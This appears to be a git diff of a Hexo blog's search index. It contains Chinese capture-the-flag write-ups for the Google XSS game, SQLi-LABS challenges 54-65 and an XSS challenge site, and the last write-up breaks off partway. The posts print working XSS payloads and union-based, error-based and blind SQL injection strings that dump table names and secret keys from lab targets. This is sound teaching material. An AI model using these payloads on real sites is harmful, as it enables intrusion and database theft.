@@ -3,7 +3,7 @@
   <entry>
     <title>Google XSS game(2017)</title>
     <url>/2021/03/10/Google%20XSS%20game(2017)/</url>
-    <content><![CDATA[<h1 id="Google-XSS-game-2017"><a href="#Google-XSS-game-2017" class="headerlink" title="Google XSS game(2017)"></a>Google XSS game(2017)</h1><p>这是新版的谷歌XSS靶场，每一关的过关条件是能够弹出**alert()**即可。</p>
+    <content><![CDATA[<h1 id="Google-XSS-game-2017"><a href="#Google-XSS-game-2017" class="headerlink" title="Google XSS game(2017)"></a>Google XSS game(2017)</h1><p>这是新版的谷歌XSS靶场，每一关的过关条件是能够弹出alert()即可。</p>
 <p>地址：<a class="link"   href="http://www.xssgame.com/" >http://www.xssgame.com/<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309171755100.png" alt="image-20210309171755100"></p>
 <p>基础题，直接输入基本的反射型XSS语句：</p>
@@ -13,7 +13,7 @@
 <h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172238727.png" alt="image-20210309172238727"></p>
 <p>和旧版的level 4一样，我们查看页面元素</p>
 <p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172452175.png" alt="image-20210309172452175"></p>
-<p>发现我么在输入框输入的值被传递到了<code>startTimer()</code>函数中，于是我们可以直接闭合掉前一个函数，另外加上**alert()**，并且把后面的内容注释掉即可：</p>
+<p>发现我么在输入框输入的值被传递到了<code>startTimer()</code>函数中，于是我们可以直接闭合掉前一个函数，另外加上alert()，并且把后面的内容注释掉即可：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
 <p>这里网上还有另一种解法是，先查看源码：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span><br><span class="line">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.loading.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">          <span class="built_in">window</span>.message.innerHTML = <span class="string">&#x27;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&#x27;</span>;</span><br><span class="line">        &#125;, seconds * <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
@@ -172,7 +172,7 @@
   <entry>
     <title>Google XSS game</title>
     <url>/2021/03/10/Google%20XSS%20game/</url>
-    <content><![CDATA[<h2 id="Google-XSS-game"><a href="#Google-XSS-game" class="headerlink" title="Google XSS game"></a>Google XSS game</h2><p>这是谷歌的XSS靶场，每一关的过关条件是能够弹出**alert()**即可。</p>
+    <content><![CDATA[<h2 id="Google-XSS-game"><a href="#Google-XSS-game" class="headerlink" title="Google XSS game"></a>Google XSS game</h2><p>这是谷歌的XSS靶场，每一关的过关条件是能够弹出<code>alert()</code>即可。</p>
 <p>地址：<a class="link"   href="https://xss-game.appspot.com/" >https://xss-game.appspot.com/<i class="fas fa-external-link-alt"></i></a>  (需要科学上网)</p>
 <h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224534084.png" alt="image-20210308224534084"></p>
 <p>这是一个反射型XSS，直接输入最基本的XSS代码即可：</p>
@@ -190,13 +190,13 @@
 <ul>
 <li>函数解释</li>
 </ul>
-<p>**parseInt()**：parseInt() 函数可解析一个字符串，并返回一个整数。</p>
-<p>**unescape()**：对通过 escape() 编码的字符串进行解码。</p>
-<p>**querySelectorAll()**：返回文档中匹配指定 CSS 选择器的所有元素，返回 <a class="link"   href="https://www.runoob.com/js/js-htmldom-nodelist.html" >NodeList<i class="fas fa-external-link-alt"></i></a> 对象。NodeList 对象表示节点的集合。可以通过索引访问，索引值从 0 开始。</p>
-<p><strong>location.hash</strong> ：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。也就是说，他的作用是把URL的<code>#</code>以及<code>#</code>后面的数据取出来，</p>
-<p>**window.onload()**：方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
-<p>**<em>element</em>.addEventListener(<em>event, function, useCapture</em>)**：方法用于向指定元素添加事件句柄。第一个参数是事件的类型 (如 “click” 或 “mousedown”)。第二个参数是事件触发后调用的函数。第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
-<p>**html()**：方法设置或返回被选元素的内容（innerHTML）。当该方法用于返回内容时，则返回第一个匹配元素的内容。当该方法用于设置内容时，则重写所有匹配元素的内容。</p>
+<p>parseInt()：parseInt() 函数可解析一个字符串，并返回一个整数。</p>
+<p>unescape()：对通过 escape() 编码的字符串进行解码。</p>
+<p>querySelectorAll()：返回文档中匹配指定 CSS 选择器的所有元素，返回 <a class="link"   href="https://www.runoob.com/js/js-htmldom-nodelist.html" >NodeList<i class="fas fa-external-link-alt"></i></a> 对象。NodeList 对象表示节点的集合。可以通过索引访问，索引值从 0 开始。</p>
+<p>location.hash ：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。也就是说，他的作用是把URL的<code>#</code>以及<code>#</code>后面的数据取出来，</p>
+<p>window.onload()：方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
+<p><em>element</em>.addEventListener(<em>event, function, useCapture</em>)：方法用于向指定元素添加事件句柄。第一个参数是事件的类型 (如 “click” 或 “mousedown”)。第二个参数是事件触发后调用的函数。第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
+<p>html()：方法设置或返回被选元素的内容（innerHTML）。当该方法用于返回内容时，则返回第一个匹配元素的内容。当该方法用于设置内容时，则重写所有匹配元素的内容。</p>
 <ul>
 <li>利用方法</li>
 </ul>
@@ -377,99 +377,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQLi-LABS (Challenges) 54-65关</title>
-    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
-    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
-<ul>
-<li><strong>判断闭合方式和参数数据类型</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
-<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
-<ul>
-<li><strong>判断字段数</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
-<p>得出查询返回的字段数有3个</p>
-<ul>
-<li><strong>查询有可注入的字段</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
-<p>可见字段2，3是可以显示出来的。</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
-<p>可知表名为 ttyxbfpvca</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
-<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
-<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
-<ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
-<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
-<p>得知表名为：7dvdblb1tl</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
-<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
-<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
-<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQLmap 常用命令</title>
     <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
@@ -564,6 +471,99 @@
       </tags>
   </entry>
   <entry>
+    <title>SQLi-LABS (Challenges) 54-65关</title>
+    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
+    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
+<ul>
+<li><strong>判断闭合方式和参数数据类型</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
+<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
+<ul>
+<li><strong>判断字段数</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
+<p>得出查询返回的字段数有3个</p>
+<ul>
+<li><strong>查询有可注入的字段</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
+<p>可见字段2，3是可以显示出来的。</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
+<p>可知表名为 ttyxbfpvca</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
+<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
+<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
+<ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
+<p>得知表名为：7dvdblb1tl</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
+<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
+<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
+<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/12/18/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
@@ -579,6 +579,148 @@
       <categories>
         <category>杂谈</category>
       </categories>
+  </entry>
+  <entry>
+    <title>XSS 挑战赛</title>
+    <url>/2021/03/10/XSS%E6%8C%91%E6%88%98%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="XSS-挑战赛"><a href="#XSS-挑战赛" class="headerlink" title="XSS 挑战赛"></a>XSS 挑战赛</h1><p>地址：<a class="link"   href="http://test.ctf8.com/" >http://test.ctf8.com/<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153435510.png" alt="image-20210310153435510"></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153507626.png" alt="image-20210310153507626"></p>
+<p>可以看到URL中的参数name被显示出来，直接把name参数构造为XSS语句即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level1.php?name&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310153651773.png" alt="image-20210310153651773"></p>
+<p>看上去和 level 1 一样，先测试一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level2.php?keyword&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;&amp;submit&#x3D;%E6%90%9C%E7%B4%A2</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310154203498.png" alt="image-20210310154203498"></p>
+<p>发现没有用猜测是标签被转义解析为文本，再查看input标签，我们输入的语句也在这里的value中显示出来，我们可以尝试从这里进行利用。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310154822757.png" alt="image-20210310154822757"></p>
+<p>使用<code>&quot;</code>把value的值进行闭合，再构造onclick事件进行alert()，最后用<code>//</code>把后面的注释掉</p>
